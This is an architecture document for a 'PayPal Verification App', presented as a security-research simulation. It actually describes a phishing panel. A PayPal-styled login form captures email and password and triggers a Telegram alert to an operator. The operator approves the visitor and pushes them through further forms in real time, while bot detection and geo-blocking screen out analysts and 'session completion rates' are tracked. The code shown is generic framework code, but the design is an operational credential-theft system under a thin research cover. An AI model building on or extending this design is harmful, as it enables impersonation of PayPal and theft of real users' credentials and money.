# 🏗️ Architecture Documentation

This document provides a comprehensive overview of the PayPal Verification App's architecture, design patterns, and technical decisions.

## Table of Contents
- [System Overview](#system-overview)
- [Architecture Patterns](#architecture-patterns)
- [Component Design](#component-design)
- [Data Flow](#data-flow)
- [Security Architecture](#security-architecture)
- [Performance Considerations](#performance-considerations)
- [Scalability Design](#scalability-design)
- [Technology Stack](#technology-stack)

## System Overview

The PayPal Verification App is a high-fidelity simulation platform designed for security research and verification flow testing. It implements a dual-interface architecture with real-time monitoring capabilities.

### Core Components

```
┌─────────────────────────────────────────────────────────────┐
│                    PayPal Verification App                  │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐     │
│  │ User Client │    │   Backend   │    │ Admin Client│     │
│  │ (Angular)   │◄──►│  (Node.js)  │◄──►│ (Dashboard) │     │
│  └─────────────┘    └─────────────┘    └─────────────┘     │
├─────────────────────────────────────────────────────────────┤
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐     │
│  │ PostgreSQL  │    │    Redis    │    │   Socket   │     │
│  │  Database   │    │    Cache    │    │    IO      │     │
│  └─────────────┘    └─────────────┘    └─────────────┘     │
└─────────────────────────────────────────────────────────────┘
```

## Architecture Patterns

### 1. **Event-Driven Architecture**

The system uses Socket.IO for real-time communication between clients and server:

```typescript
// Server-side event handling
io.on('connection', (socket) => {
  socket.on('join', (sessionId) => {
    socket.join(sessionId);
  });

  socket.on('command', (cmd) => {
    // Process admin command
    io.to(cmd.sessionId).emit('command', cmd);
  });
});
```

### 2. **Command Query Responsibility Segregation (CQRS)**

Admin commands are separated from query operations:

```typescript
// Commands (write operations)
app.post('/api/command', (req, res) => {
  const { sessionId, action, payload } = req.body;
  await queueCommand(sessionId, action, payload);
  io.to(sessionId).emit('command', { action, payload });
});

// Queries (read operations)
app.get('/api/sessions', (req, res) => {
  const sessions = await getAllSessions(adminId);
  res.json(sessions);
});
```

### 3. **Observer Pattern**

Angular Signals provide reactive state management:

```typescript
// State service using signals
export class StateService {
  readonly currentView = signal<ViewState>('login');
  readonly stage = signal<VerificationStage>('login');

  // Computed signals
  readonly isFormValid = computed(() => {
    return this.email().includes('@') && this.password().length > 0;
  });

  // Effects for side effects
  constructor() {
    effect(() => {
      const view = this.currentView();
      // Auto-save to localStorage
      localStorage.setItem('currentView', view);
    });
  }
}
```

### 4. **Repository Pattern**

Database operations are abstracted through repository interfaces:

```typescript
// Repository interface
interface SessionRepository {
  getSession(id: string): Promise<Session | null>;
  upsertSession(session: Session): Promise<void>;
  deleteSession(id: string): Promise<void>;
}

// Implementation
class DatabaseSessionRepository implements SessionRepository {
  async getSession(id: string): Promise<Session | null> {
    const result = await pool.query('SELECT * FROM sessions WHERE id = $1', [id]);
    return result.rows[0] || null;
  }
}
```

## Component Design

### Frontend Architecture

#### **Standalone Components**

All Angular components are standalone for better tree-shaking:

```typescript
@Component({
  selector: 'app-login',
  standalone: true,
  imports: [CommonModule, FormsModule, PublicLayoutComponent],
  template: `<!-- Template -->`
})
export class LoginComponent {
  state = inject(StateService);

  submitLogin() {
    this.state.submitLogin(this.email, this.password);
  }
}
```

#### **Service Layer**

Services handle business logic and external communication:

```typescript
@Injectable({
  providedIn: 'root'
})
export class AuthService {
  private http = inject(HttpClient);

  login(credentials: LoginCredentials): Observable<AuthResponse> {
    return this.http.post<AuthResponse>('/api/admin/login', credentials);
  }
}
```

### Backend Architecture

#### **Layered Architecture**

```
┌─────────────────┐
│   Controllers   │  ← HTTP request handling
├─────────────────┤
│   Services      │  ← Business logic
├─────────────────┤
│   Repositories  │  ← Data access
├─────────────────┤
│   Models        │  ← Data structures
└─────────────────┘
```

#### **Middleware Chain**

Security and functionality middleware are composed:

```typescript
// Security middleware chain
app.use(cors(corsOptions));
app.use(helmet());
app.use(rateLimit);
app.use(requestLogger);
app.use(botDetection);
app.use(sanitizeMiddleware);
app.use(validateSession);

// Route handlers
app.use('/api', apiRoutes);
```

## Data Flow

### User Journey Flow

```
1. User visits site
   ↓
2. Security check (client-side integrity)
   ↓
3. Login form submission
   ↓
4. Server sync (session creation)
   ↓
5. Admin notification (Telegram)
   ↓
6. Admin approval/rejection
   ↓
7. Real-time command delivery
   ↓
8. Progressive form advancement
   ↓
9. Final verification completion
```

### Session Synchronization Flow

```
User Action → State Change → Sync Request → Server Processing → Database Update → Admin Notification → Real-time Broadcast
```

### Admin Command Flow

```
Admin Action → Command Creation → Queue Storage → Socket Broadcast → Client Reception → State Update → UI Refresh
```

## Security Architecture

### Defense in Depth

#### **1. Network Layer**
- Rate limiting (Redis-backed)
- CORS policy enforcement
- IP-based restrictions
- Geo-blocking capabilities

#### **2. Application Layer**
- Input validation (Zod schemas)
- XSS protection (DOMPurify)
- CSRF protection (JWT tokens)
- Session management (secure cookies)

#### **3. Data Layer**
- SQL injection prevention (parameterized queries)
- Data encryption (sensitive fields)
- Audit logging (tamper-proof logs)
- Access control (RBAC)

### Authentication & Authorization

```typescript
// JWT-based authentication
const authenticateToken = (req: Request, res: Response, next: Function) => {
  const token = req.headers.authorization?.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'Access token required' });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    res.status(403).json({ error: 'Invalid token' });
  }
};

// Role-based authorization
const requireRole = (role: string) => {
  return (req: Request, res: Response, next: Function) => {
    if (req.user.role !== role && req.user.role !== 'hypervisor') {
      return res.status(403).json({ error: 'Insufficient permissions' });
    }
    next();
  };
};
```

## Performance Considerations

### **Caching Strategy**

#### **Application Level**
- Static asset caching (immutable headers)
- API response caching (Redis)
- Database query result caching
- Session data caching

#### **Database Level**
- Connection pooling (pg.Pool)
- Query optimization (indexes)
- Prepared statements
- Read replicas (future)

### **Optimization Techniques**

#### **Bundle Optimization**
```typescript
// Angular build configuration
export const config: ApplicationConfig = {
  providers: [
    provideServiceWorker('ngsw-worker.js', {
      enabled: !isDevMode(),
      registrationStrategy: 'registerWhenStable:30000'
    }),
    provideHttpClient(
      withInterceptorsFromDi(),
      withFetch() // Use native fetch
    )
  ]
};
```

#### **Lazy Loading**
```typescript
// Route-based code splitting
const routes: Routes = [
  {
    path: 'admin',
    loadComponent: () => import('./admin/admin.component'),
    canActivate: [authGuard]
  }
];
```

#### **Image Optimization**
- WebP format support
- Responsive images
- Lazy loading
- CDN delivery

## Scalability Design

### **Horizontal Scaling**

#### **Stateless Application**
- No server-side sessions
- External state storage (PostgreSQL/Redis)
- Container-ready architecture
- Environment-based configuration

#### **Load Balancing**
```nginx
upstream backend {
    least_conn;
    server app1:8080 weight=3;
    server app2:8080 weight=3;
    server app3:8080 weight=1;
    server app4:8080 weight=1;
}
```

### **Database Scaling**

#### **Read Replicas**
```sql
-- Read from replica
SELECT * FROM sessions WHERE last_seen > $1
-- Read from master for writes
INSERT INTO sessions (id, data) VALUES ($1, $2)
```

#### **Sharding Strategy**
- Session sharding by admin ID
- Geographic data distribution
- Archive old sessions to separate tables

### **Caching Layer**

#### **Multi-Level Caching**
1. **Browser Cache**: Static assets, immutable resources
2. **CDN Cache**: Global distribution, edge locations
3. **Application Cache**: API responses, computed data
4. **Database Cache**: Query results, frequently accessed data

## Technology Stack

### **Frontend Stack**

| Component | Technology | Version | Purpose |
|-----------|------------|---------|---------|
| Framework | Angular | 18.x | Component-based UI |
| Language | TypeScript | 5.6.x | Type safety |
| Styling | Tailwind CSS | 3.4.x | Utility-first CSS |
| State | Angular Signals | 18.x | Reactive state |
| HTTP | Fetch API | Native | Network requests |
| Real-time | Socket.IO Client | 4.8.x | WebSocket communication |

### **Backend Stack**

| Component | Technology | Version | Purpose |
|-----------|------------|---------|---------|
| Runtime | Node.js | 22.x | JavaScript runtime |
| Framework | Express.js | 4.21.x | Web framework |
| Language | TypeScript | 5.6.x | Type safety |
| Real-time | Socket.IO | 4.8.x | WebSocket server |
| Database | PostgreSQL | 15.x | Primary database |
| Cache | Redis | 7.x | Session caching |
| Logging | Winston | 3.17.x | Structured logging |

### **DevOps Stack**

| Component | Technology | Version | Purpose |
|-----------|------------|---------|---------|
| Container | Docker | 25.x | Application containerization |
| Orchestration | Kubernetes | 1.28.x | Container orchestration |
| CI/CD | GitHub Actions | Latest | Automated pipelines |
| Monitoring | Prometheus | 2.45.x | Metrics collection |
| Alerting | Grafana | 10.x | Visualization |
| Security | Trivy | Latest | Vulnerability scanning |

### **Security Stack**

| Component | Technology | Version | Purpose |
|-----------|------------|---------|---------|
| Web Security | Helmet | 8.x | Security headers |
| Rate Limiting | express-rate-limit | 7.x | Request throttling |
| Validation | express-validator | 7.x | Input validation |
| Sanitization | DOMPurify | 3.x | XSS prevention |
| Encryption | bcrypt | 5.x | Password hashing |
| Authentication | jsonwebtoken | 9.x | JWT tokens |

## Deployment Patterns

### **Development Environment**
- Hot reload development server
- SQLite database for simplicity
- Local Redis instance
- Comprehensive logging

### **Staging Environment**
- Docker Compose deployment
- PostgreSQL database
- Redis caching
- Automated testing

### **Production Environment**
- Kubernetes orchestration
- PostgreSQL cluster
- Redis cluster
- Multi-region deployment
- CDN integration

## Monitoring & Observability

### **Application Metrics**
- Request/response times
- Error rates by endpoint
- Active sessions count
- Database connection pool usage
- Memory and CPU usage

### **Business Metrics**
- Session completion rates
- Admin response times
- Geographic distribution
- Device/browser analytics

### **Infrastructure Metrics**
- Container resource usage
- Network latency
- Database performance
- Cache hit/miss ratios

This architecture documentation provides a comprehensive view of the system's design principles, patterns, and technical decisions that make the PayPal Verification App a robust, scalable, and secure platform.